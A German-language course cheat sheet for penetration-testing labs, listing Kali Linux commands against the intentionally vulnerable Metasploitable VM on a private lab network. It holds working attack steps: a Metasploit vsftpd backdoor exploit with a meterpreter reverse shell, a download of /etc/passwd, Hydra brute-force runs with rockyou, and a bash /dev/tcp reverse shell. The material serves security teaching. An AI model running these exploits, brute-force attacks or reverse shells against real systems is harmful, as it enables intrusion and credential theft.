# ITSE – Kali & Metasploitable Codesammlung

Dieses Dokument enthält wichtige Befehle, die im Unterricht und bei Laborübungen
mit **Kali Linux** und **Metasploitable** nützlich sind.  
Es dient als schnelle Referenz für Scans, Exploits und typische Angriffe.

---

## 🕵️‍♂️ 1. Netzwerkscan & Recon
```bash
# Aktive Hosts im Subnetz finden
nmap -sn 192.168.56.0/24

# Detail-Scan auf spezifischem Host (OS, Services, Versionen)
nmap -A 192.168.56.101

# Schneller Scan der Top-1000 Ports
nmap -T4 -F 192.168.56.101
```

⸻

⚡ 2. Metasploit Basics
```bash
# Metasploit starten
msfconsole

# Exploit suchen
search vsftpd

# Exploit laden
use exploit/unix/ftp/vsftpd_234_backdoor

# Ziel setzen
set RHOST 192.168.56.101

# Payload wählen (Reverse Shell)
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set LHOST 192.168.56.1
set LPORT 4444

# Angriff starten
exploit
```

⸻

💻 3. Meterpreter Essentials
```bash
# Offene Sessions anzeigen
sessions

# Mit Session verbinden
sessions -i 1

# Systeminfos auslesen
sysinfo

# Shell auf Zielsystem öffnen
shell

# Dateien hochladen/herunterladen
download /etc/passwd
upload localfile.txt /tmp/
```

⸻

🔑 4. Passwortangriffe
```bash
# Hydra – SSH Brute Force
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.101

# HTTP Basic Auth Attacke
hydra -l admin -P passwords.txt 192.168.56.101 http-get /protected
```

⸻

🌐 5. Web-Scanning & Schwachstellen
```bash
# Nikto – Webserver-Schwachstellen finden
nikto -h http://192.168.56.101

# Dirb / Gobuster – Versteckte Verzeichnisse finden
gobuster dir -u http://192.168.56.101 -w /usr/share/wordlists/dirb/common.txt
```

⸻

🐧 6. Nützliche Linux Kommandos
```bash
# IP-Adresse der Kali VM anzeigen
ip a

# Aktuellen Benutzer anzeigen
whoami

# Dienste und offene Ports prüfen
netstat -tulpn
```

⸻

🔄 7. Reverse Shell Beispiele
```bash
# Netcat Listener auf Angreifer
nc -lvnp 4444

# Reverse Shell auf Ziel (wenn möglich)
bash -i >& /dev/tcp/192.168.56.1/4444 0>&1
```

